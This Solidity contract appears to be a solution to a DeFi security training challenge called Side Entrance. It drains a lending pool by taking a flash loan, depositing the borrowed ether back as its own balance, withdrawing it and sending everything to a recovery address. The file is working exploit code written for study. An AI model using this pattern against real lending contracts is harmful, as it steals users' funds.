// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceExploit is IFlashLoanEtherReceiver {
    address private immutable _recovery;

    SideEntranceLenderPool private immutable _pool;

    constructor(address pool, address recovery) {
        _pool = SideEntranceLenderPool(pool);
        _recovery = recovery;
    }

    function attack(uint256 amount) external {
        _pool.flashLoan(amount); // take out a flash loan
        _pool.withdraw(); // withdraw the eth that was deposited during the loan

        payable(_recovery).transfer(address(this).balance); // send all received eth to the recovery address
    }

    function execute() external payable {
        _pool.deposit{value: msg.value}(); // immediately deposit the received eth back into the pool
    }

    // required to receive raw eth transfers
    receive() external payable {}
}
